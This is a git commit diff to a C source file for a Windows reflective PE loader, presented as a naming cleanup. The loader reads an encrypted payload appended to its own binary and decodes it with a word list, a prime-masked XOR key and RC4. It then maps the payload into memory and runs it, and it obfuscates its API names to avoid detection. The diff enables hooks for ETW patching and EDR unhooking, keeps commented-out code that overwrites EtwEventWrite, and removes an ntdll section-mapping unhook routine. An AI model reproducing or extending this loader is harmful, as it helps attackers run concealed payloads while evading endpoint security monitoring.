7d53b70ca60dbe9f4aaba53b872faf48595cf6d1
Adrian Lohr <mail@adrianlohr.de>
2023-08-23 20:25:43 +0200

    cleanup: Remove old code chunks; straighten naming convention

--- windows/reflective_loader.c
+++ windows/reflective_loader.c
@@ -2,9 +2,6 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <windows.h>
-// #include <winternl.h>
-// #include <ntdef.h>
-// #include <psapi.h>
 
 #define KEY_LENGTH 16 // 128 bits
 #define PRIME_LENGTH 8 // 64 bits
@@ -12,11 +9,10 @@
 #define INFLATION_FACTOR 3 // is equal to word length for word encoding
 
 // Declarations
-void* load_PE (char* PE_data);
-int decrypt_elf(unsigned char *elf_buf, size_t file_size, unsigned char *key, size_t key_size);
-void import_table_obfuscation(void);
-// void disable_etw(void);
-// void remove_edr_hooks(void);
+void* load_pe (char* PE_data);
+void obfuscate_import_table(void);
+void patch_etw(void);
+void remove_edr_hooks(void);
 
 typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
 typedef HMODULE (WINAPI * pLoadLibraryA)(LPCTSTR lpFileName);
@@ -27,6 +23,7 @@ pLoadLibraryA fnLoadLibraryA;
 pVirtualAlloc fnVirtualAlloc;
 pGetCurrentProcess fnGetCurrentProcess;
 
+// Obfuscate suspicous function names via char arrays
 unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
 unsigned char sLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0x0 };
 unsigned char sVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 };
@@ -49,20 +46,15 @@ char* wordlist[256] = {"raw\0", "moo\0", "zed\0", "nun\0", "hin\0", "ado\0", "vi
                         "few\0", "yap\0", "nag\0", "gum\0", "pan\0", "orb\0", "ant\0", "zen\0", "hob\0", "gap\0", "pew\0", "men\0", "egg\0", "pal\0"};
 
 int main(int argc, char** argv) {
-    BOOL separated = FALSE;
 
-    if (argc > 2) {
+    if (argc > 1) {
         printf("[info] Usage: %s\n", argv[0]);
         return 1;
-    } else if (argc > 2 && strcmp(argv[1], "separate")) {
-        separated = TRUE;
     }
 
-    char *subject = (separated)?argv[1]:argv[0];
-
-    import_table_obfuscation();
-    // disable_etw();
-    // remove_edr_hooks();
+    obfuscate_import_table();
+    patch_etw();
+    remove_edr_hooks();
 
     FILE* loader_file = fopen(argv[0], "rb");
     if (loader_file == NULL) {
@@ -74,7 +66,7 @@ int main(int argc, char** argv) {
         perror("Failed to seek to end of file");
         return 1;
     }
-    // Read the last 8 bytes
+
     char size_buffer[40]; // 8 byte encrypted_size + 32 byte ascii key string
     size_t read_size = fread(size_buffer, 1, sizeof(size_buffer), loader_file);
     if (read_size != sizeof(size_buffer)) {
@@ -88,10 +80,8 @@ int main(int argc, char** argv) {
     printf("[info] Encrypted size: %i\n", encrypted_size);
     printf("[info] Obfuscated Decode key: %.32s\n", key_hexstring);
 
-    // Get the current module VA (ie PE header addr)
     char* loader_handle = (char*)GetModuleHandleA(NULL);
 
-    // get to the section header
     IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) loader_handle;
     IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);
@@ -113,11 +103,9 @@ int main(int argc, char** argv) {
         return 1;   
     }
 
-    // Allocate memory and read the whole file
     char* pe_buf = malloc(encrypted_size);
     memcpy(pe_buf, payload_PE, encrypted_size);
 
-    // Get key from input and decode to byte array
     const char *pos = key_hexstring;
     unsigned char key[KEY_LENGTH];
 
@@ -131,10 +119,10 @@ int main(int argc, char** argv) {
     size_t original_size = encrypted_size/INFLATION_FACTOR;
     char *decoded_buf = malloc(original_size);
     memset(decoded_buf, 0, original_size);
-    decrypt_PE(pe_buf, decoded_buf, encrypted_size, original_size, key);
+    decrypt_pe(pe_buf, decoded_buf, encrypted_size, original_size, key);
 
     printf("[info] Load PE\n");
-    void* start_address = load_PE(decoded_buf);
+    void* start_address = load_pe(decoded_buf);
 
     printf("[info] Calling PE\n");
     if(start_address) {
@@ -147,37 +135,35 @@ int main(int argc, char** argv) {
     return 0;
 }
 
-void* load_PE(char* PE_data) {
+void* load_pe(char* PE_data) {
     // DEFINITIONS OF HEADERS AND CO.
     IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) PE_data;
     IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1); 
 
-    // Get header information for loading
     DWORD hdr_image_base = p_NT_HDR->OptionalHeader.ImageBase;
     DWORD size_of_image = p_NT_HDR->OptionalHeader.SizeOfImage;
     DWORD entry_point_RVA = p_NT_HDR->OptionalHeader.AddressOfEntryPoint;
     DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;
     WORD num_of_sections = p_NT_HDR->FileHeader.NumberOfSections;
 
-    printf("[info] hdr_image_base:%i\nsize_of_image:%i\nentry_point_RVA:%i\nsize_of_headers:%i\nnum_of_sections:%i\n", hdr_image_base, size_of_image, entry_point_RVA, size_of_headers, num_of_sections);
+     printf("[info] hdr_image_base:%i\n\
+            size_of_image:%i\n\
+            entry_point_RVA:%i\n\
+            size_of_headers:%i\n\
+            num_of_sections:%i\n", hdr_image_base, size_of_image, entry_point_RVA, size_of_headers, num_of_sections);
 
     char* image_base = (char*)fnVirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if(image_base == NULL) return NULL; // allocation didn't work
 
-    printf("[info] Copy PE section wise into memory\n");
     // COPY HEADERS TO MEMORY
     memcpy(image_base, PE_data, size_of_headers);
     // Copy PE section wise into memory
     for (int i = 0; i < num_of_sections; ++i) {
-        // calculate the Virtual Address we need to copy the content, from the Relative Virtual Address 
-        // section[i].VirtualAddress is a Relative Virtual Address
         char* dest_addr = image_base + sections[i].VirtualAddress;
         DWORD raw_data_size = sections[i].SizeOfRawData;
 
-        // check if there is raw data to copy
         if (raw_data_size > 0) {
-            // We copy SizeOfRawData bytes, from the offset PointerToRawData in the file
             memcpy(dest_addr, PE_data + sections[i].PointerToRawData, raw_data_size);
         } else {
             memset(dest_addr, 0, sections[i].Misc.VirtualSize);
@@ -189,13 +175,10 @@ void* load_PE(char* PE_data) {
     // IMPORT TABLE
     IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;
 
-    // load the address of the import descriptors array
     IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
-    // this array is null terminated
     for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {
 
-        // Get the name of the dll, and import it
         char* module_name = image_base + import_descriptors[i].Name;
         HMODULE import_module = fnLoadLibraryA(module_name);
         printf("[info] Module Name: %s\n", module_name);
@@ -205,26 +188,18 @@ void* load_PE(char* PE_data) {
             continue;
         }
 
-        // the lookup table points to function names or ordinals => it is the IDT
         IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].OriginalFirstThunk);
 
-        // the address table is a copy of the lookup table at first
-        // but we put the addresses of the loaded function inside => that's the IAT
         IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].FirstThunk);
 
-        // null terminated array, again
         for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
             void *function_handle = NULL;
 
-            // Check the lookup table for the adresse of the function name to import
             DWORD lookup_addr = lookup_table[i].u1.AddressOfData;
 
             if ((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1
-                // import by name : get the IMAGE_IMPORT_BY_NAME struct
                 IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME *)(image_base + lookup_addr);
-                // this struct points to the ASCII function name
                 char *funct_name = (char *)&(image_import->Name);
-                // get that function address from it's module and name
                 function_handle = (void *)GetProcAddress(import_module, funct_name);
             } else {
                 // import by ordinal, directly
@@ -238,7 +213,6 @@ void* load_PE(char* PE_data) {
                 continue;
             }
 
-            // change the IAT, and put the function address inside.
             address_table[i].u1.Function = (DWORD)function_handle;
         }
     }
@@ -246,32 +220,21 @@ void* load_PE(char* PE_data) {
     printf("[info] Handle Relocations\n");
 
     // RELOCATIONS
-    // this is how much we shifted the ImageBase
     DWORD delta_VA_reloc = ((DWORD)image_base) - p_NT_HDR->OptionalHeader.ImageBase;
 
-    // if there is a relocation table, and we actually shitfted the ImageBase
     if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_VA_reloc != 0) {
 
-        //calculate the relocation table address
         IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*) (image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
-        //once again, a null terminated array
         while (p_reloc->VirtualAddress != 0) {
 
-            // how many relocations in this block?
-            // i.e. the total size, minus the size of the "header", divided by 2 (those are words, so 2 bytes for each)
             DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
-            // the first relocation element in the block, right after the header (using pointer arithmetic again)
             WORD* reloc = (WORD*) (p_reloc + 1);
             for (int i = 0; i < size; ++i) {
-                // type is the first 4 bits of the relocation word
                 int type = reloc[i] >> 12;
-                // offset is the last 12 bits
                 int offset = reloc[i] & 0x0fff;
-                // this is the address we are going to change
                 DWORD* change_addr = (DWORD*) (image_base + p_reloc->VirtualAddress + offset);
 
-                // there is only one type used that needs to make a change
                 switch(type) {
                     case IMAGE_REL_BASED_HIGHLOW :
                         *change_addr += delta_VA_reloc;
@@ -281,17 +244,14 @@ void* load_PE(char* PE_data) {
                 }
             }
 
-            // switch to the next relocation block, based on the size
             p_reloc = (IMAGE_BASE_RELOCATION*) (((DWORD) p_reloc) + p_reloc->SizeOfBlock);
         }
     }
 
     // PERMISSIONS
-    // Set permission for the PE header to read only
     DWORD old_protect;
     fnVirtualProtect(image_base, size_of_headers, PAGE_READONLY, &old_protect);
 
-    // Match permissions from headers
     for (int i = 0; i < num_of_sections; ++i) {
         char* dest_addr = image_base + sections[i].VirtualAddress;
         DWORD section_flags = sections[i].Characteristics;
@@ -310,65 +270,32 @@ void* load_PE(char* PE_data) {
 
 // ============= LOADER OBFUSCATION HERE =============
 
-void import_table_obfuscation(void) {
+void obfuscate_import_table(void) {
     fnVirtualProtect = (pVirtualProtect) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualProtect);
     fnLoadLibraryA = (pLoadLibraryA) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sLoadLibraryA);
     fnVirtualAlloc = (pVirtualAlloc) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualAlloc);
     fnGetCurrentProcess = (pGetCurrentProcess) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sGetCurrentProcess);
 }
 
-// void disable_etw(void) {
-// 	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
+void patch_etw(void) {
+	// unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
 	
-// 	ULONG oldprotect = 0;
-// 	size_t size = sizeof(patch);
+	// ULONG oldprotect = 0;
+	// size_t size = sizeof(patch);
 	
-// 	HANDLE hCurrentProc = fnGetCurrentProcess();
+	// HANDLE hCurrentProc = fnGetCurrentProcess();
+	// void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
+    // fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);
+
+	// memcpy(pEventWrite, patch, size / sizeof(patch[0]));
 	
-// 	void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
-	
-//     fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);
+    // fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
+	// FlushInstructionCache(hCurrentProc, pEventWrite, size);
+}
 
-// 	memcpy(pEventWrite, patch, size / sizeof(patch[0]));
-	
-//     fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
-// 	FlushInstructionCache(hCurrentProc, pEventWrite, size);
-// }
-
-// void remove_edr_hooks(void) {
-//     // Öffnen der Sektion für ntdll.dll in Known DLLs
-//     UNICODE_STRING uNtdll = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
-//     OBJECT_ATTRIBUTES objAttrs;
-//     InitializeObjectAttributes(&objAttrs, &uNtdll, OBJ_CASE_INSENSITIVE, NULL, NULL);
-//     HANDLE hSection;
-//     NTSTATUS status = NtOpenSection(&hSection, SECTION_ALL_ACCESS, &objAttrs);
-
-//     if (!NT_SUCCESS(status)) {
-//         printf("[info] Konnte Sektion für ntdll.dll nicht öffnen\n");
-//         return 1;
-//     }
-
-//     // Mappen der Sektion in den eigenen Prozess
-//     void* pLocalNtdll = NULL;
-//     SIZE_T viewSize = 0;
-//     status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalNtdll, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READWRITE);
-
-//     if (!NT_SUCCESS(status)) {
-//         printf("[info] Konnte Sektion für ntdll.dll nicht mappen\n");
-//         return 1;
-//     }
-
-//     // Überschreiben der .TEXT-Sektion
-//     DWORD oldProtect;
-//     fnVirtualProtect(pLocalNtdll, viewSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-//     BYTE patch[] = { 0x48, 0x33, 0xc0, 0xc3 };  // xor rax, rax; ret
-//     memcpy(pLocalNtdll, patch, sizeof(patch));
-
-//     // Entladen der sauberen ntdll.dll
-//     fnVirtualProtect(pLocalNtdll, viewSize, oldProtect, &oldProtect);
-//     NtUnmapViewOfSection(GetCurrentProcess(), pLocalNtdll);
-//     NtClose(hSection);
-// }
+ void remove_edr_hooks(void) {
+    // TODO
+}
 
 
 // =============== DEOBFUSCATION HERE ================
@@ -376,16 +303,15 @@ void import_table_obfuscation(void) {
 char decode_word(char* word) {
     for (int i = 0; i < 256; i++) {
         if (!strcmp(wordlist[i], word)) {
-            // printf("[info] %s == %s", wordlist[i], word);
-            // printf("[info]  decoded: %.2x \n", i);
             return (char)i;
         }
     }
     printf("[error] Decoding failed for: %s\n", word);
+
     return '\0';
 }
 
-uint64_t prime_number(uint64_t n) {
+uint64_t calc_prime_number(uint64_t n) {
     uint64_t last_prime = 0;
     for (uint64_t number = 0; number <= n; number++) {
         int prime = 1;
@@ -398,7 +324,7 @@ uint64_t prime_number(uint64_t n) {
     return last_prime;
 }
 
-void swap(unsigned char *a, unsigned char *b) {
+void rc4_swap(unsigned char *a, unsigned char *b) {
     unsigned char temp = *a;
     *a = *b;
     *b = temp;
@@ -411,7 +337,7 @@ void rc4_init(unsigned char *s, unsigned char *key) {
     }
     for (i = 0; i < 256; i++) {
         j = (j + s[i] + key[i % KEY_LENGTH]) % 256;
-        swap(&s[i], &s[j]);
+        rc4_swap(&s[i], &s[j]);
     }
 }
 
@@ -420,19 +346,19 @@ void rc4_crypt(unsigned char *s, unsigned char *data, int data_len) {
     for (k = 0; k < data_len; k++) {
         i = (i + 1) % 256;
         j = (j + s[i]) % 256;
-        swap(&s[i], &s[j]);
+        rc4_swap(&s[i], &s[j]);
         data[k] ^= s[(s[i] + s[j]) % 256];
     }
 }
 
-int decrypt_PE(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key) {
+int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key) {
 
     printf("[info] Start prime calculation\n");
-    uint64_t last_prime = prime_number(PRIME_TOP);
+    uint64_t last_prime = calc_prime_number(PRIME_TOP);
     uint8_t* prime_ptr = (uint8_t *)(&last_prime);
     printf("[info] Last prime number: %llu\n", last_prime);
    
-    // Decode Words
+    // word decode
     char *decode_pos = decode_buf;
     for (size_t i = 0; i < encrypted_size; i += INFLATION_FACTOR) {
         char word[4] = {pe_buf[i], pe_buf[i+1], pe_buf[i+2], '\0'};
@@ -440,7 +366,7 @@ int decrypt_PE(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypte
         decode_pos++;
     }
 
-    // XOR decode key with prime 
+    // XOR decode key with prime number
     for (size_t i = 0; i < KEY_LENGTH; i++) {
         key[i] ^= prime_ptr[i % PRIME_LENGTH];
     }
@@ -451,7 +377,7 @@ int decrypt_PE(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypte
     }
     printf("[info] Deobfuscated Key: %s\n", hex_string);
 
-    // Decode XOR
+    // XOR decode
     for (size_t i = 0; i < original_size; i++) {
         decode_buf[i] ^= key[i % KEY_LENGTH];
     }
@@ -461,5 +387,6 @@ int decrypt_PE(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypte
     rc4_crypt(s, decode_buf, original_size);
 
     printf("[info] Decoded Last Byte: %.2x Decoded First Byte: %.2x\n", decode_buf[0], decode_buf[original_size-1]);
+    
     return 0;
 }
